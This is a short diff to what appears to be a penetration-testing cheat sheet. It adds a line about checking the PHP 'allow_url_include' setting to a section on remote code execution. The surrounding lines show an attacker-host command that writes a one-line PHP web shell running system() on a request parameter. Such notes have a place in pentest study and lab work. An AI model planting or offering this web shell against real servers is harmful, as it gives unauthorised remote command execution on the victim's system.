@@ -125,7 +125,10 @@ POST /submitDetails.php HTTP/1.1
 ---
 ## Remote Code Execution
 ### PHP 
+
 This method requires the PHP `expect` module to be installed and enabled.
+Check PHP configurations to see if (`allow_url_include`) setting is enabled.
+
 * Attacker host
 ``` bash
 echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
